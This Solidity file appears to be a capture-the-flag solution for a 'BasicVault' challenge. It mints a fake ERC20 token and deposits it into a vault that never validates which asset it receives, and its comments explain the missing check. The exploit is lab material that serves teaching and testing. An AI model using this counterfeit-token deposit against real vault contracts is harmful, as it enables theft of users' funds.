// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "../../contracts/BasicVault/Vault.sol";
import "../../contracts/BasicVault/Setup.sol";

contract Solve {
    Vault public vault;

    FakeToken public token; // Fake token

    Setup public setup; // Setup contract address

    constructor(address _setup) {
        setup = Setup(_setup);
        vault = Vault(setup.vault());
    }

    function solve() public {
        // Create fake token
        token = new FakeToken();
        // Approve Vault to spend 1_001 * 10 ** 18 token
        token.approve(address(vault), 1_001 * 10 ** 18);
        // Deposit to Vault
        vault.deposit(address(token), 1_001 * 10 ** 18);

        // Explain:
        // 1. Vault do not check asset is WannaETH or PhantomToken or not
        // 2. User can deposit any ERC20 token to Vault

        //Check if solved
        require(setup.isSolved(), "Not solved");
    }
}

contract FakeToken is ERC20 {
    constructor() ERC20("FakeToken", "FTK") {
        _mint(msg.sender, 1_000_000 * 10 ** 18);
    }
}
